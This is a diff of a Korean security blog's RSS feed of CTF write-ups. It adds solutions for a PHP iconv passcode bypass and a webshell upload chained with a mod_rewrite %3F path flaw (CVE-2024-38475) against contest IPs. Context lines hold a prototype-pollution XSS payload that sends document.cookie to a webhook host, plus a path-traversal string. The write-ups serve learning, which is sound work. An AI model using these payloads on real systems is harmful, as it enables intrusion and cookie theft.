+&lt;ul&gt;
+&lt;li&gt;timetravel&lt;/li&gt;
+&lt;li&gt;04-정보자원관리원&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr /&gt;
+&lt;p&gt;곧 CCE인데 연습할겸 apollo에 나왔던 문제들 몇 개를 간단하게 write up 작성해보겠다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;timetravel&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+  $timeInterval = 5;
+  
+  if ($_SERVER[&quot;REQUEST_METHOD&quot;] == &quot;POST&quot;) {
+      while (ob_get_level()) {
+          ob_end_clean();
+      }
+  
+      session_start();
+      $_SESSION[&apos;time&apos;] = date(&apos;Y-m-d H:i:s&apos;);
+  
+      if (!isset($_SESSION[&apos;last_attempt&apos;])) {
+          $_SESSION[&apos;last_attempt&apos;] = time();
+      } else {
+          $currentTime = time();
+          $timeElapsed = $currentTime - $_SESSION[&apos;last_attempt&apos;];
+  
+          if ($timeElapsed &amp;lt; $timeInterval) {
+              die(&apos;No Bruteforce&apos;);
+          }
+  
+          $_SESSION[&apos;last_attempt&apos;] = $currentTime;
+      }
+  
+      $passcord = htmlspecialchars($_POST[&apos;passcord&apos;]);
+      $passcord = mb_strcut($passcord, 0, 3, &apos;UTF-8&apos;);
+      $flag = getenv(&apos;flag&apos;);
+  
+      ob_start(null, 4096);
+      $output = &apos;생략&apos;;
+      function safe_iconv($in_charset, $out_charset, $str)
+      {
+          $result = @iconv($in_charset, $out_charset, $str);
+  
+          if ($result === false) {
+              throw new Exception(&quot;iconv conversion failed: Detected an illegal character in input string&quot;);
+          }
+          return $result;
+      }
+  
+      $dummy = str_repeat(&quot;A&quot;, 1098);
+      try {
+          $passcord = safe_iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
+      } catch (Exception $e) {
+          header(&quot;location:index.html&quot;);
+          echo &quot;redirected&quot;;
+          exit();
+      } finally {
+          $passcord = iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
+          $passcord_hex = bin2hex($passcord);
+          error_log(&quot;Passcord: &quot; . $passcord_hex);
+          if (strlen($passcord_hex) &amp;gt;= 8) {
+              $fourth_byte_hex = substr($passcord_hex, 6, 2);
+              $fourth_byte_value = hexdec($fourth_byte_hex);
+  
+              if ($fourth_byte_value &amp;gt;= 0x48 &amp;amp;&amp;amp; $fourth_byte_value &amp;lt;= 0x4C) {
+                  header(&quot;location:index.html&quot;);
+                  echo &quot;redirected&quot;;
+                  exit();
+              } else {
+                  error_log(&quot;OK&quot;);
+              }
+          } else {
+              header(&quot;location:index.html&quot;);
+              echo &quot;redirected&quot;;
+              exit();
+          }
+          
+      }
+  
+      $newoutput = str_replace(&quot;{{ passcord }}&quot;, $passcord, $output);
+      $newoutput = str_replace(&quot;{{ dummy }}&quot;, $dummy, $newoutput);
+      $newoutput = str_replace(&quot;{{ flag }}&quot;, $flag, $newoutput);
+  
+      echo $newoutput;
+      $saved_time = $_SESSION[&apos;time&apos;];
+      $comparison_time = &apos;2028-08-03 18:05:00&apos;;
+      $saved_time_obj = new DateTime($saved_time);
+      $comparison_time_obj = new DateTime($comparison_time);
+  
+      if ($saved_time_obj &amp;lt; $comparison_time_obj) {
+          ob_clean();
+          $newoutput = &quot;&quot;;
+          header(&quot;location:index.html&quot;);
+          echo &quot;redirected&quot;;
+      }
+      ob_flush();
+      flush();
+  }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;code&gt;passcord&lt;/code&gt;가 맞으면 플래그를 준다.
+중요한 부분만 뽑아서 passcord에 대해 분석해보자&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;$passcord = mb_strcut($passcord, 0, 3, &apos;UTF-8&apos;);
+$passcord = iconv(&quot;UTF-8&quot;, &quot;ISO-2022-CN-EXT&quot;, $passcord);
+$passcord_hex = bin2hex($passcord);
+
+if (strlen($passcord_hex) &amp;gt;= 8) {
+    $fourth_byte_hex = substr($passcord_hex, 6, 2);
+    $fourth_byte_value = hexdec($fourth_byte_hex);
+
+    if ($fourth_byte_value &amp;gt;= 0x48 &amp;amp;&amp;amp; $fourth_byte_value &amp;lt;= 0x4C) {
+        header(&quot;location:index.html&quot;);
+        echo &quot;redirected&quot;;
+        exit();
+    } else {
+        error_log(&quot;OK&quot;);
+    }
+} else {} // 실패 로직 생략
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ol&gt;
+&lt;li&gt;앞에서 3바이트 strcut&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ISO-2022-CN-EXT&lt;/code&gt; 변환&lt;/li&gt;
+&lt;li&gt;4번째 바이트가 &lt;code&gt;0x48 ~ 0x4C&lt;/code&gt; 사이에 있으면 &lt;code&gt;exit();&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;pre&gt;&lt;code&gt;import subprocess
+
+for i in range(0x20, 0x3000):
+    ch = chr(i)
+    if len(ch.encode(&apos;utf-8&apos;)) &amp;gt; 3:
+        continue
+    p = subprocess.run(
+        [&apos;iconv&apos;, &apos;-f&apos;, &apos;UTF-8&apos;, &apos;-t&apos;, &apos;ISO-2022-CN-EXT&apos;],
+        input=ch.encode(),
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL
+    )
+    out = p.stdout
+    if len(out) &amp;lt; 4:
+        continue
+    b4 = out[3]
+    if 0x48 &amp;lt;= b4 &amp;lt;= 0x4C:
+        continue
+    print(f&quot;{repr(ch)} -&amp;gt; 4th byte: {b4:#04x}&quot;)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;익스플로잇은 간단하게 나온다. 빨리 풀려고 좀 분석 때리고 지피티보고 짜달라했다&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./f_excode.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;flag: cce2024{d82e4e7f1882be6a45b603ad2a552e513f680d2c25547aa3cdcd80f0edbabd4f}&lt;/code&gt;&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h2&gt;04-정보자원관리원&lt;/h2&gt;
+&lt;p&gt;&lt;code&gt;/readflag&lt;/code&gt;가 존재하기에 RCE 해야한다는걸 알 수 있다.
+난 php rce 문제가 나오면 보통 웹셸하고 php 역직렬화를 먼저 의심해보는편이다.
+역직렬화 포인트는 딱히 안보이고, 업로드 기능이 &lt;code&gt;/api/report_check.php&lt;/code&gt;에 존재하기에 웹셸 업로드라고 생각했다.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+    session_start();
+    if(!isset($_SESSION[&apos;uid&apos;])) {
+        header(&apos;Location: /login.php&apos;);
+    }
+
+    include &apos;../config/db.php&apos;;
+
+    function generateRandomString($length = 10) {
+        $characters = &apos;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&apos;;
+        $charactersLength = strlen($characters);
+        $randomString = &apos;&apos;;
+    
+        for ($i = 0; $i &amp;lt; $length; $i++) {
+            $randomString .= $characters[random_int(0, $charactersLength - 1)];
+        }
+    
+        return $randomString;
+    }
+
+    $name = $_POST[&apos;name&apos;];
+    $content = $_POST[&apos;content&apos;];
+    $author = $_SESSION[&apos;uid&apos;];
+
+    if(!$name || !$content) {
+        die(&quot;신고자 및 신고 대상자를 모두 입력해주세요.&quot;);
+    }
+
+    $maxFileSize = 3 * 1024 * 1024; // 5MB
+
+    $evidence = $_FILES[&apos;evidence&apos;];
+    
+    $random_name = generateRandomString();
+    if($evidence[&apos;size&apos;] &amp;gt; 0) {
+        if($evidence[&apos;size&apos;] &amp;gt; $maxFileSize) {
+            die(&quot;파일 크기는 3MB 이하여야 합니다.&quot;);
+        }
+        if($evidence[&apos;error&apos;] === 0) {
+            $evidencePath = &apos;/app/report/&apos; . $name . &apos;_&apos; . $random_name.&apos;_&apos;.$evidence[&apos;name&apos;];
+            move_uploaded_file($evidence[&apos;tmp_name&apos;], $evidencePath);
+        }
+    
+        $ext = pathinfo($evidencePath, PATHINFO_EXTENSION);
+        $stmt = $dbcon-&amp;gt;prepare(&quot;INSERT INTO report (name, content, evidence, author_id) VALUES (?, ?, ?, ?)&quot;);
+        $stmt-&amp;gt;bind_param(&quot;ssss&quot;, $name, $content, $evidencePath, $author);
+        $stmt-&amp;gt;execute();
+    
+        if($ext !== &apos;zip&apos;){
+            die(&quot;zip 파일만 업로드 가능합니다.&quot;);
+        }
+    
+        echo &quot;&amp;lt;script&amp;gt;alert(&apos;신고가 완료되었습니다. 신고번호 : &quot;.$random_name.&quot;&apos;);history.go(-1)&amp;lt;/script&amp;gt;&quot;;
+    } else {
+        $stmt = $dbcon-&amp;gt;prepare(&quot;INSERT INTO report (name, content, author_id) VALUES (?, ?, ?)&quot;);
+        $stmt-&amp;gt;bind_param(&quot;sss&quot;, $name, $content, $author);
+        $stmt-&amp;gt;execute();
+        echo &quot;&amp;lt;script&amp;gt;alert(&apos;신고가 완료되었습니다. 신고번호 : &quot;.$random_name.&quot;&apos;);history.go(-1)&amp;lt;/script&amp;gt;&quot;;
+    }
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;코드를 잘 읽어보면 모든 파일을 업로드 하고 마지막에 zip 파일만 업로드 가능하다고 die를 하는 버그가 있다.&lt;/p&gt;
+&lt;p&gt;따라서 php webshell을 넣을 수 있다.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./webshell.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;그러나 &lt;code&gt;random_name&lt;/code&gt;을 붙이기에 바로 웹셸을 실행할 수 는 없다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;p&gt;000-default.conf에서 &lt;code&gt;RewriteRule&lt;/code&gt;이라는걸 쓰길래 구글링해봤고 &lt;code&gt;CVE-2024-38475&lt;/code&gt;가 존재한다는걸 알 수 있었다.
+이 취약점은 &lt;code&gt;mod_rewrite&lt;/code&gt;가 사용되는 구버전의 apache HTTP server에서 &lt;code&gt;%3F&lt;/code&gt;를 붙이게 되면 파싱을 잘못해서 &lt;code&gt;LFI&lt;/code&gt;가 터지는 그런거라고 하는데
+경로뒤에 &lt;code&gt;%3F&lt;/code&gt; 넣으면 다 익스 되길래 정확히는 안찾아봤다&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;http://16.184.15.57:8090/user/admin/pw.json%3F&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;이렇게 해서 어드민 계정을 가져올 수 있다.&lt;/p&gt;
+&lt;p&gt;이후에 &lt;code&gt;http://16.184.15.57:8090/admin/api/post_select.php&lt;/code&gt;에서 sqli로 디비털어서 웹셸명 찾고 &lt;code&gt;/readflag&lt;/code&gt; 실행하면 끝이다&lt;/p&gt;
+&lt;p&gt;글을 쓰는 시점에 누군가 admin 기능을 먹통으로 만들어놔서 이 부분 풀이는 적지 않겠다&lt;/p&gt;
+&lt;hr /&gt;
+&lt;h1&gt;후기&lt;/h1&gt;
+&lt;p&gt;이번에도 역시 sqli가 발목을 잡았다.
+다른 취약점들도 시간이 걸리긴 했지만 꽤 쉽게 알아챘던거 같은데 SQL 인젝션은 지피티랑 씨름해서 겨우 페이로드 얻었다&lt;/p&gt;
+&lt;p&gt;제발 이번에 1인분만 하길..&lt;/p&gt;
+</content:encoded></item><item><title>2025 HackQuest [Simple Note] Write-Up</title><link>https://itznullbyte.github.io/posts/hackquest/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/hackquest/</guid><description> </description><pubDate>Tue, 22 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;카이스트에서 주최한 HackQuest에 참가했고 웹 4문제 중 3문제를 풀었다.&lt;br /&gt;
 못 푼 한 문제가 아래에서 설명할 &lt;code&gt;Simple Note&lt;/code&gt;보다 쉬운 문제였지만 헤메다 풀지 못했다.&lt;/p&gt;
 &lt;h2&gt;Simple Note (Web)&lt;/h2&gt;
 &lt;pre&gt;&lt;code&gt;app.get(&apos;/track&apos;, (req, res) =&amp;gt; {
@@ -80,13 +685,13 @@ html 삽입은 가능하지만 &lt;code&gt;DOMPurify.sanitize()&lt;/code&gt; 되
 &lt;pre&gt;&lt;code&gt;http://158.247.241.230:10897/view/?id=29f97926-66da-4d01-9a80-b69c6b49da52&amp;amp;[constructor][prototype][url]=data:text/javascript;charset=utf-8,document.location.href=&apos;https://webhook/test?q=&apos;+%2Bdocument.cookie;//&amp;amp;[constructor][prototype][dataType]=script&amp;amp;[constructor][prototype][crossDomain]=
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;&lt;code&gt;flag: hackquest2025{caf7088a3562e36cb29876b8dd45a3384f4b0d0533ecc2778234b845693eca03}&lt;/code&gt;&lt;/p&gt;
-</content:encoded></item><item><title>AJOU COSS CTF 2025 Final 후기</title><link>https://fuwari.vercel.app/posts/cossctf-final/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cossctf-final/</guid><description> </description><pubDate>Sun, 20 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;대회장 입장&lt;/h2&gt;
+</content:encoded></item><item><title>AJOU COSS CTF 2025 Final 후기</title><link>https://itznullbyte.github.io/posts/cossctf-final/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf-final/</guid><description> </description><pubDate>Sun, 20 Jul 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;대회장 입장&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;./start.jpg&quot; alt=&quot;&quot; /&gt;
-아주대 COSS CTF 본선 갔다왔다. 하고 싶은 말이 많은데 생각나는대로 적어보겠다.&lt;/p&gt;
+아주대 COSS CTF 본선 갔다왔다. 생각나는대로 적어보겠다.&lt;/p&gt;
 &lt;p&gt;일단 9시에 30분 일찍 대회장 도착했다. 30분 동안 대기실에 있었는데 아는 사람이 없어서 구석에서 인스타 보고 있었다
 팀원들 만나고 대회장 들어갔다.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;./teamtag.jpg&quot; alt=&quot;&quot; /&gt;
-강의실에서 대회 진행했는데 진짜 강의실 일체형 의자는 지옥이다. 대회 내내 허리아파 죽는줄 알았다&lt;/p&gt;
+강의실에서 대회 진행했는데 진짜 강의실 일체형 나무 의자는 지옥이다. 대회 내내 허리아파 죽는줄 알았다&lt;/p&gt;
 &lt;p&gt;이름표 받았는데 주위 둘러보니까 이름 한 번씩 들어본 사람들이 꽤 있었다 현실에서 보니 신기했다&lt;/p&gt;
 &lt;hr /&gt;
 &lt;h2&gt;대회 시작&lt;/h2&gt;
@@ -95,24 +700,15 @@ html 삽입은 가능하지만 &lt;code&gt;DOMPurify.sanitize()&lt;/code&gt; 되
 웹 문제는 블랙박스 3문제, 화이트 박스 1문제가 나왔다&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;./first_prob.png&quot; alt=&quot;&quot; /&gt;
 첫번째는 저런식으로 입력하면 파일 다운해주는 서비스였다&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;/flag&lt;/code&gt; 읽어오면 됐는데 경로 필터링때메 안읽혔다
-단순하게 &lt;code&gt;get .....///.....///.....///.....///.....///.....///flag&lt;/code&gt; 이런식으로 읽으면 읽어졌는데 이걸 못풀고 팀원이 익스했다.&lt;br /&gt;
-진짜 처음으로 CTF 풀다 현타가 왔다. 드림핵 레벨 1도 안 될법한 문제를 못 푼건 진짜 사고다.&lt;/p&gt;
-&lt;p&gt;그리고 블박 문제중에 &lt;code&gt;file:///&lt;/code&gt; 써서 서버코드 따고 &lt;code&gt;gopher://&lt;/code&gt;로 익스하는 SSRF 문제있었는데 이것도 끝날 때까지 못풀었다. file 생각못하고 진짜 이 세상에 존재하는 스키마 다 때려넣어봤는데..
-뭐 변명을 해보자면 오프라인 CTF가 처음이라 꽤 긴장하기도 했었고 내가 부족했던거도 맞다.&lt;br /&gt;
-당연히 모든 문제가 미친듯이 어려울줄 알았고, 서버세팅이 구버전인걸 보고 발광해서 CVE만 계속 찾는 헛짓거리를 한 것도 있다.&lt;/p&gt;
-&lt;p&gt;0솔 나온 블박 문제중에 하나를 잠깐 설명해보자면 글 쓰기, 읽기 등 기능이 있는 게시판 서비스가 있었는데 이게 싹 다 페이크였다.
-게시판 관련 기능 중엔 취약점 하나도 없었고 그냥 로그인 페이지 주석에 &lt;code&gt;/filter&lt;/code&gt; 경로 나와있었다
-여기에서 WAF 정보 보여주고 그냥 Sqli해서 어드민 따는 문제였다.&lt;/p&gt;
-&lt;p&gt;대회때 여기까진 파악했는데 sqli를 못했다.&lt;/p&gt;
-&lt;p&gt;내가 25년 초반에 웹해킹 시작할 때부터 SQL 문법 공부하기 싫어서 진짜 딱 그거만 빼고 공부했다&lt;/p&gt;
-&lt;p&gt;그 문제만 퍼블 냈어도 5등으로 턱걸이해서 상 받는건데 지금 생각하면 아쉽긴하다. 암튼 그래도 못 푼 건 못 푼거다.&lt;/p&gt;
+&lt;p&gt;웹 최다솔브 나온 문제였는데 오래 잡고있던건 진짜 사고다&lt;/p&gt;
+&lt;p&gt;중간에 밥 나왔는데 맛있었다&lt;/p&gt;
+&lt;p&gt;오프라인 CTF는 처음이라 좀 긴장해서 그런지 아무것도 못했던거 같다.&lt;/p&gt;
 &lt;hr /&gt;
-&lt;p&gt;그래서 결국 난 0솔로 마무리했다.
+&lt;p&gt;결국 난 0솔로 마무리했다.
 CTF하면서 0솔한건 처음 같은데 0솔한거 자체보단 당연히 풀법한 문제들을 못풀었다는게 더 참담했다.&lt;/p&gt;
 &lt;p&gt;다음 CTF까지는 팀원들한테 민폐 안끼치도록 열심히 공부할 생각이다.
 CCE 전까진 부족한 부분 기초 개념까진 메우고 드림핵 5~6레벨 위주로 풀어볼 생각이다&lt;/p&gt;
-</content:encoded></item><item><title>AJOU COSS CTF Pre-Qual 2025 Write-Up</title><link>https://fuwari.vercel.app/posts/cossctf/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cossctf/</guid><description>3th</description><pubDate>Mon, 23 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
+</content:encoded></item><item><title>AJOU COSS CTF Quals 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/cossctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cossctf/</guid><description>3th</description><pubDate>Mon, 23 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
 &lt;p&gt;&lt;img src=&quot;./scoreboard.jpg&quot; alt=&quot;&quot; /&gt;
 운 좋게도 예선 3등했다.&lt;/p&gt;
 &lt;p&gt;아주대 CTF 열린다고 해서 세명컴고 팀원 두 분이랑 아는 웹 해커 한 분이랑 같이 예선 나갔다.&lt;br /&gt;
@@ -313,7 +909,7 @@ f
 &lt;/code&gt;&lt;/pre&gt;
 &lt;p&gt;저렇게 다 따로 출력하는 이유는 플래그에 있는 중괄호 필터링 때문에 응답이 안와서 한 글자씩 중괄호만 빼고 출력해서 그렇다&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;flag{c59abb2a665a38345ee0d92687aeec35002721ccfd12a807b802a3436afe6183bcc618e1953771fd39ed3d3bbd696f947b3e90408547246a}&lt;/code&gt;&lt;/p&gt;
-</content:encoded></item><item><title>Physics I Problem Solving</title><link>https://fuwari.vercel.app/posts/physics/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
+</content:encoded></item><item><title>Physics I Problem Solving</title><link>https://itznullbyte.github.io/posts/physics/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/physics/</guid><description> </description><pubDate>Tue, 03 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;물리 실력이 부족하다는걸 느꼈다.&lt;/p&gt;
 &lt;p&gt;보안 문제 풀이 쓰는거 처럼 푼 물리문제 정리해놓으면 기억에 남을거 같아서 시작해본다.&lt;/p&gt;
 &lt;h2&gt;Solve&lt;/h2&gt;
 &lt;h3&gt;2019 학년도 9월 모평 6번&lt;/h3&gt;
@@ -534,7 +1130,7 @@ $gh = 2v^2$&lt;/p&gt;
 $\frac{x}{d} = \sqrt{\frac{3}{20}}$&lt;/p&gt;
 &lt;p&gt;&lt;code&gt;답: 5&lt;/code&gt;&lt;/p&gt;
 &lt;hr /&gt;
-</content:encoded></item><item><title>CVE-2023-51219 Kakaotalk One Click Exploit</title><link>https://fuwari.vercel.app/posts/cve-2020-0601/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/cve-2020-0601/</guid><description> </description><pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
+</content:encoded></item><item><title>CVE-2023-51219 Kakaotalk One Click Exploit</title><link>https://itznullbyte.github.io/posts/cve-2020-0601/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/cve-2020-0601/</guid><description> </description><pubDate>Mon, 02 Jun 2025 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;:::note
 https://stulle123.github.io/posts/kakaotalk-account-takeover/&lt;br /&gt;
 stulle123님의 블로그를 기반으로 합니다.
 :::&lt;/p&gt;
@@ -585,7 +1181,7 @@ https://katalk.kakao.com/win32/account/register_device.json&lt;/p&gt;
 &lt;p&gt;각각 모바일, PC에서의 인증번호를 받는 HTTP API 입니다.&lt;/p&gt;
 &lt;p&gt;탈취한 access_token을 사용해 PIN 번호를 임의로 가져올 수 있었습니다.&lt;/p&gt;
 &lt;p&gt;이로써 공격자는 완전히 피해자의 카카오톡 계정을 탈취했습니다.&lt;/p&gt;
-</content:encoded></item><item><title>Codegate 2025 Pre-Quals Write-Up</title><link>https://fuwari.vercel.app/posts/codegate/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/codegate/</guid><description>Hard..</description><pubDate>Thu, 03 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Solve&lt;/h2&gt;
+</content:encoded></item><item><title>Codegate 2025 Quals Write-Up</title><link>https://itznullbyte.github.io/posts/codegate/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/codegate/</guid><description>Hard..</description><pubDate>Thu, 03 Apr 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Solve&lt;/h2&gt;
 &lt;ul&gt;
 &lt;li&gt;Hello Codegate (misc)&lt;/li&gt;
 &lt;li&gt;Captcha World (misc)&lt;/li&gt;
@@ -995,7 +1591,7 @@ await button.click();
 &lt;/ul&gt;
 &lt;p&gt;주니어부 0솔까지 갈 정도로 어려웠던 문제는 아니었던거 같은데 0솔인건 좀 의문이다&lt;/p&gt;
 &lt;p&gt;확실히 CSP랑 dompurify에 대한 지식이 거의 없었어서 문제의도 파악이 어려웠던거 같다. 공부해야겠다&lt;/p&gt;
-</content:encoded></item><item><title>SSU CTF 2025 Write-Up</title><link>https://fuwari.vercel.app/posts/ssuctf/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/ssuctf/</guid><description>Overall 28th, General 17th</description><pubDate>Sun, 26 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
+</content:encoded></item><item><title>SSU CTF 2025 Write-Up</title><link>https://itznullbyte.github.io/posts/ssuctf/</link><guid isPermaLink="true">https://itznullbyte.github.io/posts/ssuctf/</guid><description>Overall 28th, General 17th</description><pubDate>Sun, 26 Jan 2025 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;Comment&lt;/h2&gt;
 &lt;p&gt;어려웠다.. 웹에서 처음보는 기법들이 많이 나와서 손도 못댔다&lt;br /&gt;
 비교적 쉽게 나온 다른 분야 몇문제만 풀었다. 팀원들이 잘해줘서 생각보다 잘 나온거 같다.
 100점짜리 문제는 올솔브했다&lt;/p&gt;
